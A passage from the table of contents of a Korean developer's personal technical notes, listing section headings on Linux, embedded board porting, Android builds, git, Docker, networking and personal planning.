        - <span class="section-num">3.132.1</span> [start virtual machine](#start-virtual-machine)
        - <span class="section-num">3.132.2</span> [control virtual machine](#control-virtual-machine)
    - <span class="section-num">3.133</span> [ntopng](#ntopng)
    - <span class="section-num">3.134</span> [Docker](#docker)
        - <span class="section-num">3.134.1</span> [설치](#설치)
        - <span class="section-num">3.134.2</span> [명령어 요약](#명령어-요약)
        - <span class="section-num">3.134.3</span> [container 이미지 만들기](#container-이미지-만들기)
        - <span class="section-num">3.134.4</span> [Dockerfile 로 이미지 만들기](#dockerfile-로-이미지-만들기)
        - <span class="section-num">3.134.5</span> [Volume 사용하기](#volume-사용하기)
        - <span class="section-num">3.134.6</span> [포트 Publish 사용하기](#포트-publish-사용하기)
        - <span class="section-num">3.134.7</span> [볼륨 컨테이너 사용하기](#볼륨-컨테이너-사용하기)
        - <span class="section-num">3.134.8</span> [Docker compose](#docker-compose)
    - <span class="section-num">3.135</span> [gogs](#gogs)
    - <span class="section-num">3.136</span> [tar 묶어서 바로 풀기](#tar-묶어서-바로-풀기)
    - <span class="section-num">3.137</span> [automount disable](#automount-disable)
    - <span class="section-num">3.138</span> [beep](#beep)
    - <span class="section-num">3.139</span> [nfs mount option](#nfs-mount-option)
    - <span class="section-num">3.140</span> [udev 를 이용한 static device name 만들기](#udev-를-이용한-static-device-name-만들기)
    - <span class="section-num">3.141</span> [Network performance test](#network-performance-test)
    - <span class="section-num">3.142</span> [CONFIG\_CFG80211\_INTERNAL\_REGDB](#config-cfg80211-internal-regdb)
        - <span class="section-num">3.142.1</span> [중요](#중요)
    - <span class="section-num">3.143</span> [tags 사용법](#tags-사용법)
        - <span class="section-num">3.143.1</span> [cscope](#cscope)
        - <span class="section-num">3.143.2</span> [gtags](#gtags)
    - <span class="section-num">3.144</span> [ack](#ack)
        - <span class="section-num">3.144.1</span> [rc 파일](#rc-파일)
        - <span class="section-num">3.144.2</span> [사용법](#사용법)
        - <span class="section-num">3.144.3</span> [c 소스 파일 찾기](#c-소스-파일-찾기)
        - <span class="section-num">3.144.4</span> [Change all "this" to "that" in all Perl files in a tree.](#change-all-this-to-that-in-all-perl-files-in-a-tree-dot)
        - <span class="section-num">3.144.5</span> [링크](#링크)
    - <span class="section-num">3.145</span> [ag](#ag)
        - <span class="section-num">3.145.1</span> [사용법](#사용법)
    - <span class="section-num">3.146</span> [shell colored output](#shell-colored-output)
        - <span class="section-num">3.146.1</span> [grammer](#grammer)
    - <span class="section-num">3.147</span> [memtester](#memtester)
    - <span class="section-num">3.148</span> [imx6 cpu 열 관련](#imx6-cpu-열-관련)
    - <span class="section-num">3.149</span> [imx ddr stress test from u-boot](#imx-ddr-stress-test-from-u-boot)
    - <span class="section-num">3.150</span> [gdb arguments 사용](#gdb-arguments-사용)
    - <span class="section-num">3.151</span> [cpu 정보](#cpu-정보)
    - <span class="section-num">3.152</span> [Raspberry Pi](#raspberry-pi)
        - <span class="section-num">3.152.1</span> [CLI](#cli)
    - <span class="section-num">3.153</span> [passwd length](#passwd-length)
    - <span class="section-num">3.154</span> [HiDPI 설정](#hidpi-설정)
    - <span class="section-num">3.155</span> [w5300 포팅](#w5300-포팅)
    - <span class="section-num">3.156</span> [w5300 포팅                                           :w5300:wiznet:tcpip:NXP:FreeScale](#w5300-포팅-w5300-wiznet-tcpip-nxp-freescale)
        - <span class="section-num">3.156.1</span> [Device Tree 소스 변경](#device-tree-소스-변경)
        - <span class="section-num">3.156.2</span> [W5300 Driver 변경](#w5300-driver-변경)
    - <span class="section-num">3.157</span> [install via usbstick](#install-via-usbstick)
        - <span class="section-num">3.157.1</span> [linuxmint](#linuxmint)
        - <span class="section-num">3.157.2</span> [debian](#debian)
    - <span class="section-num">3.158</span> [default java config](#default-java-config)
    - <span class="section-num">3.159</span> [make menuconfig error](#make-menuconfig-error)
    - <span class="section-num">3.160</span> [Disable swap](#disable-swap)
        - <span class="section-num">3.160.1</span> [링크](#링크)
    - <span class="section-num">3.161</span> [Nexell 보드에 oracle embedded java 설치](#nexell-보드에-oracle-embedded-java-설치)
    - <span class="section-num">3.162</span> [java embedded 한글 지원](#java-embedded-한글-지원)
    - <span class="section-num">3.163</span> [imx6 java porting](#imx6-java-porting)
    - <span class="section-num">3.164</span> [git 이미 인덱스에 포함된 디렉토리 제외하기](#git-이미-인덱스에-포함된-디렉토리-제외하기)
    - <span class="section-num">3.165</span> [git 특정 해쉬 커밋만 보기](#git-특정-해쉬-커밋만-보기)
    - <span class="section-num">3.166</span> [dns 설정 :dns:resolv.conf:](#dns-설정-dns-resolv-dot-conf)
    - <span class="section-num">3.167</span> [Freescale memory read write tool](#freescale-memory-read-write-tool)
    - <span class="section-num">3.168</span> [GIT 리모트 저장소 특정 브랜치 가져오기](#git-리모트-저장소-특정-브랜치-가져오기)
    - <span class="section-num">3.169</span> [rotate display with xrandr](#rotate-display-with-xrandr)
    - <span class="section-num">3.170</span> [소스 파일 코딩 스타일 변경](#소스-파일-코딩-스타일-변경)
    - <span class="section-num">3.171</span> [git ignore have aleady have been commited file](#git-ignore-have-aleady-have-been-commited-file)
    - <span class="section-num">3.172</span> [shell array print reverse order](#shell-array-print-reverse-order)
    - <span class="section-num">3.173</span> [Obtain kernel config from currently running Linux system](#obtain-kernel-config-from-currently-running-linux-system)
        - <span class="section-num">3.173.1</span> [링크 - superuser](#링크-superuser)
    - <span class="section-num">3.174</span> [imx6 lvds, hdmi display mode 설정](#imx6-lvds-hdmi-display-mode-설정)
    - <span class="section-num">3.175</span> [pamir u-boot environment](#pamir-u-boot-environment)
    - <span class="section-num">3.176</span> [qt eglfs error 해결](#qt-eglfs-error-해결)
        - <span class="section-num">3.176.1</span> [참조](#참조)
    - <span class="section-num">3.177</span> [Qt 5 예제 실행](#qt-5-예제-실행)
    - <span class="section-num">3.178</span> [qt5 rotate](#qt5-rotate)
    - <span class="section-num">3.179</span> [build qt5 toolchain](#build-qt5-toolchain)
    - <span class="section-num">3.180</span> [yocto package management](#yocto-package-management)
        - <span class="section-num">3.180.1</span> [host](#host)
        - <span class="section-num">3.180.2</span> [target](#target)
    - <span class="section-num">3.181</span> [imx qt5 web package 설치](#imx-qt5-web-package-설치)
    - <span class="section-num">3.182</span> [imx ddr stress test tool 사용법](#imx-ddr-stress-test-tool-사용법)
    - <span class="section-num">3.183</span> [diff 에서 공백 문자 무시 할 때](#diff-에서-공백-문자-무시-할-때)
    - <span class="section-num">3.184</span> [xmllint 사용법](#xmllint-사용법)
        - <span class="section-num">3.184.1</span> [링크](#링크)
    - <span class="section-num">3.185</span> [whitespace 제거](#whitespace-제거)
    - <span class="section-num">3.186</span> [shell redirect error and output](#shell-redirect-error-and-output)
    - <span class="section-num">3.187</span> [IMX7D boot](#imx7d-boot)
        - <span class="section-num">3.187.1</span> [boot switch](#boot-switch)
        - <span class="section-num">3.187.2</span> [u-boot args](#u-boot-args)
    - <span class="section-num">3.188</span> [icon 위치 찾기](#icon-위치-찾기)
    - <span class="section-num">3.189</span> [reload udev rules](#reload-udev-rules)
    - <span class="section-num">3.190</span> [ipython run program](#ipython-run-program)
    - <span class="section-num">3.191</span> [disable blinking cursor at boot time](#disable-blinking-cursor-at-boot-time)
    - <span class="section-num">3.192</span> [Android 부팅시 "A N D R O I D \_" text 없애기](#android-부팅시-a-n-d-r-o-i-d-text-없애기)
    - <span class="section-num">3.193</span> [linux boot logo 변경하기](#linux-boot-logo-변경하기)
    - <span class="section-num">3.194</span> [imx7d matrix keypad 설정](#imx7d-matrix-keypad-설정)
    - <span class="section-num">3.195</span> [android selinux disable 하기](#android-selinux-disable-하기)
    - <span class="section-num">3.196</span> [Android Lollipop build fail](#android-lollipop-build-fail)
    - <span class="section-num">3.197</span> [Elapsed Time](#elapsed-time)
    - <span class="section-num">3.198</span> [gitlab command line instructions](#gitlab-command-line-instructions)
        - <span class="section-num">3.198.1</span> [git global setup](#git-global-setup)
        - <span class="section-num">3.198.2</span> [Create a new repository](#create-a-new-repository)
        - <span class="section-num">3.198.3</span> [Existing folder](#existing-folder)
        - <span class="section-num">3.198.4</span> [Existing Git repository](#existing-git-repository)
    - <span class="section-num">3.199</span> [git delete branch both local and remote](#git-delete-branch-both-local-and-remote)
    - <span class="section-num">3.200</span> [convert image from gif to jpg](#convert-image-from-gif-to-jpg)
    - <span class="section-num">3.201</span> [linux desktop recording](#linux-desktop-recording)
        - <span class="section-num">3.201.1</span> [shorcut](#shorcut)
    - <span class="section-num">3.202</span> [cpu clock speed info](#cpu-clock-speed-info)
    - <span class="section-num">3.203</span> [initramfs extract](#initramfs-extract)
    - <span class="section-num">3.204</span> [wget renaming file](#wget-renaming-file)
    - <span class="section-num">3.205</span> [ubifs fastmap u-boot args](#ubifs-fastmap-u-boot-args)
    - <span class="section-num">3.206</span> [monitor dd progress](#monitor-dd-progress)
    - <span class="section-num">3.207</span> [grabserial 사용법](#grabserial-사용법)
    - <span class="section-num">3.208</span> [Extract files from rpm](#extract-files-from-rpm)
    - <span class="section-num">3.209</span> [changing mac address](#changing-mac-address)
        - <span class="section-num">3.209.1</span> [ifconfig](#ifconfig)
        - <span class="section-num">3.209.2</span> [ip utils](#ip-utils)
        - <span class="section-num">3.209.3</span> [/etc/network/interfaces](#etc-network-interfaces)
        - <span class="section-num">3.209.4</span> [참조](#참조)
    - <span class="section-num">3.210</span> [connman static ip](#connman-static-ip)
    - <span class="section-num">3.211</span> [connman 을 이용한 multi 랜 설정](#connman-을-이용한-multi-랜-설정)
        - <span class="section-num">3.211.1</span> [mac address 설정](#mac-address-설정)
        - <span class="section-num">3.211.2</span> [고정 아이피 설정](#고정-아이피-설정)
    - <span class="section-num">3.212</span> [같은 subnet 아래 multi 랜카드 설정](#같은-subnet-아래-multi-랜카드-설정)
        - <span class="section-num">3.212.1</span> [커널 설정](#커널-설정)
        - <span class="section-num">3.212.2</span> [ARP filtering](#arp-filtering)
        - <span class="section-num">3.212.3</span> [Source Based Routing](#source-based-routing)
    - <span class="section-num">3.213</span> [linux bridge 설정](#linux-bridge-설정)
        - <span class="section-num">3.213.1</span> [커널 옵션](#커널-옵션)
        - <span class="section-num">3.213.2</span> [ip util을 이용한 브릿지 설정](#ip-util을-이용한-브릿지-설정)
    - <span class="section-num">3.214</span> [epoch convert](#epoch-convert)
    - <span class="section-num">3.215</span> [checkinstall](#checkinstall)
    - <span class="section-num">3.216</span> [systemd timer](#systemd-timer)
    - <span class="section-num">3.217</span> [openvpn 설정](#openvpn-설정)
        - <span class="section-num">3.217.1</span> [server 구성](#server-구성)
        - <span class="section-num">3.217.2</span> [client 구성](#client-구성)
        - <span class="section-num">3.217.3</span> [링크](#링크)
    - <span class="section-num">3.218</span> [vagrant 사용법](#vagrant-사용법)
    - <span class="section-num">3.219</span> [zabbix 설치](#zabbix-설치)
    - <span class="section-num">3.220</span> [zabbix user parameter](#zabbix-user-parameter)
    - <span class="section-num">3.221</span> [sshuttle 사용법](#sshuttle-사용법)
        - <span class="section-num">3.221.1</span> [요구사항](#요구사항)
        - <span class="section-num">3.221.2</span> [사용법](#사용법)
        - <span class="section-num">3.221.3</span> [링크](#링크)
    - <span class="section-num">3.222</span> [cpu load test by yes command](#cpu-load-test-by-yes-command)
    - <span class="section-num">3.223</span> [stressapptest](#stressapptest)
    - <span class="section-num">3.224</span> [fuser command to forcefully unmount a disk partition](#fuser-command-to-forcefully-unmount-a-disk-partition)
    - <span class="section-num">3.225</span> [check cpu and hard disk temperature](#check-cpu-and-hard-disk-temperature)
    - <span class="section-num">3.226</span> [ssh automatically accept keys](#ssh-automatically-accept-keys)
        - <span class="section-num">3.226.1</span> [dropbear](#dropbear)
    - <span class="section-num">3.227</span> [nvidia 그래픽 카드로 인해 리눅스 설치가 안될 때](#nvidia-그래픽-카드로-인해-리눅스-설치가-안될-때)
    - <span class="section-num">3.228</span> [nomachine NX technology remote desktop](#nomachine-nx-technology-remote-desktop)
        - <span class="section-num">3.228.1</span> [install or update](#install-or-update)
        - <span class="section-num">3.228.2</span> [remove](#remove)
        - <span class="section-num">3.228.3</span> [server start stop by systemd](#server-start-stop-by-systemd)
        - <span class="section-num">3.228.4</span> [server start stop by nxserver](#server-start-stop-by-nxserver)
    - <span class="section-num">3.229</span> [simple web server](#simple-web-server)
    - <span class="section-num">3.230</span> [git ignore](#git-ignore)
    - <span class="section-num">3.231</span> [simple ftp server](#simple-ftp-server)
    - <span class="section-num">3.232</span> [android restart command line](#android-restart-command-line)
    - <span class="section-num">3.233</span> [android shutdown command line](#android-shutdown-command-line)
    - <span class="section-num">3.234</span> [imx gstreamer image display](#imx-gstreamer-image-display)
    - <span class="section-num">3.235</span> [Disable SSH host key checking](#disable-ssh-host-key-checking)
    - <span class="section-num">3.236</span> [QtQml/QQmlApplicationEngine: No such file or directory](#qtqml-qqmlapplicationengine-no-such-file-or-directory)
    - <span class="section-num">3.237</span> [core dump](#core-dump)
    - <span class="section-num">3.238</span> [i.mx6 boot dip switch setting](#i-dot-mx6-boot-dip-switch-setting)
    - <span class="section-num">3.239</span> [docker arm](#docker-arm)
    - <span class="section-num">3.240</span> [virtual serial port](#virtual-serial-port)
        - <span class="section-num">3.240.1</span> [링크](#링크)
    - <span class="section-num">3.241</span> [INTERCEPTTY serial monitor](#interceptty-serial-monitor)
    - <span class="section-num">3.242</span> [helm shortcut](#helm-shortcut)
        - <span class="section-num">3.242.1</span> [C-]](#c)
        - <span class="section-num">3.242.2</span> [C-space](#c-space)
        - <span class="section-num">3.242.3</span> [C-c C-k](#c-c-c-k)
    - <span class="section-num">3.243</span> [picocom 사용법](#picocom-사용법)
    - <span class="section-num">3.244</span> [Date and Time](#date-and-time)
        - <span class="section-num">3.244.1</span> [date command](#date-command)
        - <span class="section-num">3.244.2</span> [timedatectl command](#timedatectl-command)
    - <span class="section-num">3.245</span> [특정 라인만 출력하기](#특정-라인만-출력하기)
    - <span class="section-num">3.246</span> [audio recording](#audio-recording)
        - <span class="section-num">3.246.1</span> [옵션](#옵션)
        - <span class="section-num">3.246.2</span> [volume](#volume)
    - <span class="section-num">3.247</span> [QApplication Without Display](#qapplication-without-display)
    - <span class="section-num">3.248</span> [user add auto script](#user-add-auto-script)
    - <span class="section-num">3.249</span> [curl 을 이용한 ftp file upload](#curl-을-이용한-ftp-file-upload)
    - <span class="section-num">3.250</span> [Kubernetes](#kubernetes)
        - <span class="section-num">3.250.1</span> [배포의 발전 단계](#배포의-발전-단계)
        - <span class="section-num">3.250.2</span> [링크](#링크)
    - <span class="section-num">3.251</span> [github pages](#github-pages)
    - <span class="section-num">3.252</span> [기본 폴더 영문으로 변경하기](#기본-폴더-영문으로-변경하기)
    - <span class="section-num">3.253</span> [<span class="org-todo done DONE">DONE</span> 매일 찾아본 영단어 단어장에 기록하여 암기하기](#매일-찾아본-영단어-단어장에-기록하여-암기하기)
    - <span class="section-num">3.254</span> [<span class="org-todo done DONE">DONE</span> google sdk 업데이트 내용 파악하기](#google-sdk-업데이트-내용-파악하기)
    - <span class="section-num">3.255</span> [<span class="org-todo done CANCELED">CANCELED</span> 파이썬으로 모래시계 비슷한 프로그램 짜기](#파이썬으로-모래시계-비슷한-프로그램-짜기)
    - <span class="section-num">3.256</span> [<span class="org-todo done DEFERRED">DEFERRED</span> 테스트 주도 개발에 대하여 공부하기](#테스트-주도-개발에-대하여-공부하기)
    - <span class="section-num">3.257</span> [<span class="org-todo done DONE">DONE</span> Debug 공부하기](#debug-공부하기)
        - <span class="section-num">3.257.1</span> [<span class="org-todo done DONE">DONE</span> 커널 디버깅 할 수 있도록 빌드](#커널-디버깅-할-수-있도록-빌드)
        - <span class="section-num">3.257.2</span> [strace 사용법](#strace-사용법)
        - <span class="section-num">3.257.3</span> [core 파일 이름과 위치](#core-파일-이름과-위치)
    - <span class="section-num">3.258</span> [kt 홈허브 설정](#kt-홈허브-설정)
    - <span class="section-num">3.259</span> [FreeScale IMX6](#freescale-imx6)
        - <span class="section-num">3.259.1</span> [imx6 player option](#imx6-player-option)
        - <span class="section-num">3.259.2</span> [lvds 출력 u-boot 옵션](#lvds-출력-u-boot-옵션)
        - <span class="section-num">3.259.3</span> [lvds 출력 관련 설정](#lvds-출력-관련-설정)
        - <span class="section-num">3.259.4</span> [pixclock 구하기](#pixclock-구하기)
    - <span class="section-num">3.260</span> [imx6 대용량 파일 복사시 죽는 문제](#imx6-대용량-파일-복사시-죽는-문제)
    - <span class="section-num">3.261</span> [error log freescale imx play video](#error-log-freescale-imx-play-video)
    - <span class="section-num">3.262</span> [sarum lvds dclk - 74.25Mhz](#sarum-lvds-dclk-74-dot-25mhz)
    - <span class="section-num">3.263</span> [Freescale MX6 android 포팅(구버전 kk4.2)](#freescale-mx6-android-포팅--구버전-kk4-dot-2)
        - <span class="section-num">3.263.1</span> [포팅 순서](#포팅-순서)
    - <span class="section-num">3.264</span> [archlinux java 패키지 설정](#archlinux-java-패키지-설정)
    - <span class="section-num">3.265</span> [Archlinux Freescale android Kitkat build](#archlinux-freescale-android-kitkat-build)
    - <span class="section-num">3.266</span> [Freescale android patch 가 리셋되는 현상](#freescale-android-patch-가-리셋되는-현상)
    - <span class="section-num">3.267</span> [cups server error](#cups-server-error)
    - <span class="section-num">3.268</span> [EB 나주 BMS 빌드 정리](#eb-나주-bms-빌드-정리)
        - <span class="section-num">3.268.1</span> [이클립스 설정](#이클립스-설정)
    - <span class="section-num">3.269</span> [NUC970](#nuc970)
        - <span class="section-num">3.269.1</span> [uboot param](#uboot-param)
        - <span class="section-num">3.269.2</span> [kernel boot args](#kernel-boot-args)
        - <span class="section-num">3.269.3</span> [ubifs](#ubifs)
    - <span class="section-num">3.270</span> [mx6 볼륨 조절및 mp3 플레이](#mx6-볼륨-조절및-mp3-플레이)
    - <span class="section-num">3.271</span> [change API error](#change-api-error)
    - <span class="section-num">3.272</span> [emmc revision fetch](#emmc-revision-fetch)
    - <span class="section-num">3.273</span> [mfgtools 용 커널 빌드 에러](#mfgtools-용-커널-빌드-에러)
    - <span class="section-num">3.274</span> [firefox menukey access disable](#firefox-menukey-access-disable)
    - <span class="section-num">3.275</span> [broadcom bluetooth 설정](#broadcom-bluetooth-설정)
    - <span class="section-num">3.276</span> [broadcom wifi android 포팅](#broadcom-wifi-android-포팅)
    - <span class="section-num">3.277</span> [ov5640 mipi 카메라 설정](#ov5640-mipi-카메라-설정)
    - <span class="section-num">3.278</span> [flashplugin](#flashplugin)
    - <span class="section-num">3.279</span> [sbload](#sbload)
    - <span class="section-num">3.280</span> [prototype error](#prototype-error)
    - <span class="section-num">3.281</span> [Freescale Linux 4.1.15\_2.00 build on debian stretch](#freescale-linux-4-dot-1-dot-15-2-dot-00-build-on-debian-stretch)
        - <span class="section-num">3.281.1</span> [build error](#build-error)
    - <span class="section-num">3.282</span> [Nexell Linux BSP build](#nexell-linux-bsp-build)
        - <span class="section-num">3.282.1</span> [source download](#source-download)
        - <span class="section-num">3.282.2</span> [toolchain](#toolchain)
        - <span class="section-num">3.282.3</span> [config](#config)
        - <span class="section-num">3.282.4</span> [build u-boot](#build-u-boot)
        - <span class="section-num">3.282.5</span> [build kernel](#build-kernel)
        - <span class="section-num">3.282.6</span> [build buildroot](#build-buildroot)
        - <span class="section-num">3.282.7</span> [make ramdisk](#make-ramdisk)
        - <span class="section-num">3.282.8</span> [usb boot](#usb-boot)
        - <span class="section-num">3.282.9</span> [writing bootloader SD/MMC](#writing-bootloader-sd-mmc)
        - <span class="section-num">3.282.10</span> [Writing Kernel](#writing-kernel)
        - <span class="section-num">3.282.11</span> [Writing Ramdisk](#writing-ramdisk)
        - <span class="section-num">3.282.12</span> [u-boot 환경 변수](#u-boot-환경-변수)
        - <span class="section-num">3.282.13</span> [fastboot](#fastboot)
        - <span class="section-num">3.282.14</span> [build script](#build-script)
        - <span class="section-num">3.282.15</span> [usb wireless lan](#usb-wireless-lan)
    - <span class="section-num">3.283</span> [userdata.img 만들기](#userdata-dot-img-만들기)
    - <span class="section-num">3.284</span> [Freescale Android 5.1.1 Lollipop build](#freescale-android-5-dot-1-dot-1-lollipop-build)
    - <span class="section-num">3.285</span> [Freescale Android 6.0.1\_2.1.0 Marshmallow build](#freescale-android-6-dot-0-dot-1-2-dot-1-dot-0-marshmallow-build)
    - <span class="section-num">3.286</span> [imx6 ubuntu rootfs build](#imx6-ubuntu-rootfs-build)
        - <span class="section-num">3.286.1</span> [Trusty](#trusty)
        - <span class="section-num">3.286.2</span> [Xenial](#xenial)
    - <span class="section-num">3.287</span> [firefox awesome bar](#firefox-awesome-bar)
    - <span class="section-num">3.288</span> [<span class="org-todo done DONE">DONE</span> 개발 서버 SSD 장착후 업그레이드 <code>[2/2]</code>](#개발-서버-ssd-장착후-업그레이드)
    - <span class="section-num">3.289</span> [Brother MFC-J2310 프린터 설정](#brother-mfc-j2310-프린터-설정)
    - <span class="section-num">3.290</span> [아르정보기술 프로젝트](#아르정보기술-프로젝트)
        - <span class="section-num">3.290.1</span> [NXP(구 FreeScale) I.MX6 보드 리눅스 포팅](#nxp--구-freescale--i-dot-mx6-보드-리눅스-포팅)
        - <span class="section-num">3.290.2</span> [NXP I.MX6 보드 리눅스 포팅](#nxp-i-dot-mx6-보드-리눅스-포팅)
        - <span class="section-num">3.290.3</span> [NXP I.MX28 보드 리눅스 포팅](#nxp-i-dot-mx28-보드-리눅스-포팅)
        - <span class="section-num">3.290.4</span> [NXP I.MX6 보드 안드로이드 포팅](#nxp-i-dot-mx6-보드-안드로이드-포팅)
        - <span class="section-num">3.290.5</span> [NXP I.MX6 보드 리눅스 포팅](#nxp-i-dot-mx6-보드-리눅스-포팅)
        - <span class="section-num">3.290.6</span> [NEXELL S5P4418 NAVI REF 리눅스 포팅](#nexell-s5p4418-navi-ref-리눅스-포팅)
        - <span class="section-num">3.290.7</span> [Raspberry PI 리눅스 포팅](#raspberry-pi-리눅스-포팅)
        - <span class="section-num">3.290.8</span> [ALLWINNER A31](#allwinner-a31)
    - <span class="section-num">3.291</span> [python socketserver](#python-socketserver)
    - <span class="section-num">3.292</span> [ternary operator (?:)](#ternary-operator)
    - <span class="section-num">3.293</span> [Kant build](#kant-build)
    - <span class="section-num">3.294</span> [imx nugat porting](#imx-nugat-porting)
    - <span class="section-num">3.295</span> [build android-7.1.2\_r9](#build-android-7-dot-1-dot-2-r9)
    - <span class="section-num">3.296</span> [Sublime Text](#sublime-text)
    - <span class="section-num">3.297</span> [IMX7 Android Oreo build](#imx7-android-oreo-build)
    - <span class="section-num">3.298</span> [Build imx-yocto-L4.9.88\_2.0.0](#build-imx-yocto-l4-dot-9-dot-88-2-dot-0-dot-0)
        - <span class="section-num">3.298.1</span> [Host package](#host-package)
        - <span class="section-num">3.298.2</span> [Project Setup](#project-setup)
        - <span class="section-num">3.298.3</span> [Build configurations](#build-configurations)
        - <span class="section-num">3.298.4</span> [Build Image](#build-image)
        - <span class="section-num">3.298.5</span> [U-Boot config emmc](#u-boot-config-emmc)
        - <span class="section-num">3.298.6</span> [Build U-boot and Kernel in Stand Alone Environment](#build-u-boot-and-kernel-in-stand-alone-environment)
    - <span class="section-num">3.299</span> [w5300 link detect 구현](#w5300-link-detect-구현)
    - <span class="section-num">3.300</span> [persistent systemd journal](#persistent-systemd-journal)
    - <span class="section-num">3.301</span> [gstreamer test video display](#gstreamer-test-video-display)
    - <span class="section-num">3.302</span> [u-boot splash 변경](#u-boot-splash-변경)
        - <span class="section-num">3.302.1</span> [v2017.03\_4.9.11\_1.0.0\_ga 버전에서의 splash 설정](#v2017-dot-03-4-dot-9-dot-11-1-dot-0-dot-0-ga-버전에서의-splash-설정)
    - <span class="section-num">3.303</span> [git push up to specific commit](#git-push-up-to-specific-commit)
    - <span class="section-num">3.304</span> [systemd silent boot](#systemd-silent-boot)
    - <span class="section-num">3.305</span> [tar 특정 디렉토리나 파일 제외 하고 묶기](#tar-특정-디렉토리나-파일-제외-하고-묶기)
    - <span class="section-num">3.306</span> [network monitor](#network-monitor)
        - <span class="section-num">3.306.1</span> [nethogs](#nethogs)
        - <span class="section-num">3.306.2</span> [iftop](#iftop)
    - <span class="section-num">3.307</span> [systemd boot-up performance check](#systemd-boot-up-performance-check)
    - <span class="section-num">3.308</span> [컴퓨터 자동 켜기](#컴퓨터-자동-켜기)
    - <span class="section-num">3.309</span> [systemd.socket 을 이용한 네트워크 서비스](#systemd-dot-socket-을-이용한-네트워크-서비스)
    - <span class="section-num">3.310</span> [local mac address](#local-mac-address)
        - <span class="section-num">3.310.1</span> [x2-xx-xx-xx-xx-xx](#x2-xx-xx-xx-xx-xx)
        - <span class="section-num">3.310.2</span> [x6-xx-xx-xx-xx-xx](#x6-xx-xx-xx-xx-xx)
        - <span class="section-num">3.310.3</span> [xA-xx-xx-xx-xx-xx](#xa-xx-xx-xx-xx-xx)
        - <span class="section-num">3.310.4</span> [xE-xx-xx-xx-xx-xx](#xe-xx-xx-xx-xx-xx)
    - <span class="section-num">3.311</span> [libpng warning: iCCP: known incorrect sRGB profile](#libpng-warning-iccp-known-incorrect-srgb-profile)
    - <span class="section-num">3.312</span> [android bootanimation 변경](#android-bootanimation-변경)
    - <span class="section-num">3.313</span> [u-boot version 보기](#u-boot-version-보기)
    - <span class="section-num">3.314</span> [IMX rootfs ownership](#imx-rootfs-ownership)
    - <span class="section-num">3.315</span> [linux bonding 설정](#linux-bonding-설정)
        - <span class="section-num">3.315.1</span> [커널 설정](#커널-설정)
        - <span class="section-num">3.315.2</span> [Configuring Bonding Manually via Sysfs](#configuring-bonding-manually-via-sysfs)
    - <span class="section-num">3.316</span> [cannon mf8284cw printer 설정](#cannon-mf8284cw-printer-설정)
    - <span class="section-num">3.317</span> [exclude directory in find](#exclude-directory-in-find)
    - <span class="section-num">3.318</span> [CAN (Controller Area Network) communication](#can--controller-area-network--communication)
        - <span class="section-num">3.318.1</span> [start](#start)
        - <span class="section-num">3.318.2</span> [stop](#stop)
        - <span class="section-num">3.318.3</span> [restart](#restart)
        - <span class="section-num">3.318.4</span> [automatic bus-off recovery](#automatic-bus-off-recovery)
        - <span class="section-num">3.318.5</span> [Display CAN device details and statistics](#display-can-device-details-and-statistics)
        - <span class="section-num">3.318.6</span> [help](#help)
        - <span class="section-num">3.318.7</span> [send](#send)
        - <span class="section-num">3.318.8</span> [receive](#receive)
    - <span class="section-num">3.319</span> [android rc.local service 추가하기 :rc.local:android:service:init:selinux:](#android-rc-dot-local-service-추가하기-rc-dot-local-android-service-init-selinux)
        - <span class="section-num">3.319.1</span> [참조](#참조)
    - <span class="section-num">3.320</span> [bluetooth test](#bluetooth-test)
    - <span class="section-num">3.321</span> [NXP I.MX Board pin control](#nxp-i-dot-mx-board-pin-control)
    - <span class="section-num">3.322</span> [imx uart driver bug fix](#imx-uart-driver-bug-fix)
    - <span class="section-num">3.323</span> [linux kernel dynamic debug](#linux-kernel-dynamic-debug)
        - <span class="section-num">3.323.1</span> [링크](#링크)
    - <span class="section-num">3.324</span> [빌드 시간 단축](#빌드-시간-단축)
        - <span class="section-num">3.324.1</span> [android](#android)
        - <span class="section-num">3.324.2</span> [yocto](#yocto)
        - <span class="section-num">3.324.3</span> [kernel](#kernel)
    - <span class="section-num">3.325</span> [NXP UUU(Universal Update Utility) 사용법](#nxp-uuu--universal-update-utility--사용법)
        - <span class="section-num">3.325.1</span> [Burn uboot into emmc](#burn-uboot-into-emmc)
        - <span class="section-num">3.325.2</span> [Burn sdcard image into emmc](#burn-sdcard-image-into-emmc)
    - <span class="section-num">3.326</span> [OPTEE](#optee)
        - <span class="section-num">3.326.1</span> [정의](#정의)
        - <span class="section-num">3.326.2</span> [imx 보드 관련](#imx-보드-관련)
    - <span class="section-num">3.327</span> [zero array](#zero-array)
    - <span class="section-num">3.328</span> [android servie restart :init.rc:android:service:restart:](#android-servie-restart-init-dot-rc-android-service-restart)
    - <span class="section-num">3.329</span> [수도요금조회](#수도요금조회)
    - <span class="section-num">3.330</span> [node version manager](#node-version-manager)
        - <span class="section-num">3.330.1</span> [설치](#설치)
    - <span class="section-num">3.331</span> [clipboard ssh key에 복사하기](#clipboard-ssh-key에-복사하기)
    - <span class="section-num">3.332</span> [<span class="org-todo done DONE">DONE</span> 평생 계획서 짜기](#평생-계획서-짜기)
    - <span class="section-num">3.333</span> [평생 계획표](#평생-계획표)
        - <span class="section-num">3.333.1</span> [건강](#건강)
        - <span class="section-num">3.333.2</span> [한국어](#한국어)
        - <span class="section-num">3.333.3</span> [외국어(10년)](#외국어--10년)
        - <span class="section-num">3.333.4</span> [일](#일)
        - <span class="section-num">3.333.5</span> [취미](#취미)
        - <span class="section-num">3.333.6</span> [사랑](#사랑)
        - <span class="section-num">3.333.7</span> [친구](#친구)
        - <span class="section-num">3.333.8</span> [삶](#삶)
    - <span class="section-num">3.334</span> [markdown 문법 체크](#markdown-문법-체크)
    - <span class="section-num">3.335</span> [hexo](#hexo)
        - <span class="section-num">3.335.1</span> [설치](#설치)
        - <span class="section-num">3.335.2</span> [테스트](#테스트)
        - <span class="section-num">3.335.3</span> [\_config.yml 설정파일](#config-dot-yml-설정파일)
        - <span class="section-num">3.335.4</span> [배포 설정](#배포-설정)
        - <span class="section-num">3.335.5</span> [hexo source 관리](#hexo-source-관리)
        - <span class="section-num">3.335.6</span> [next 테마 사용하기](#next-테마-사용하기)
        - <span class="section-num">3.335.7</span> [새 글 작성](#새-글-작성)
        - <span class="section-num">3.335.8</span> [다른 컴퓨터에서 hexo 저장소 clone 하기](#다른-컴퓨터에서-hexo-저장소-clone-하기)
        - <span class="section-num">3.335.9</span> [관련 링크](#관련-링크)
    - <span class="section-num">3.336</span> [git 저장소 이전 버전으로 되돌리기](#git-저장소-이전-버전으로-되돌리기)
    - <span class="section-num">3.337</span> [git submodule](#git-submodule)
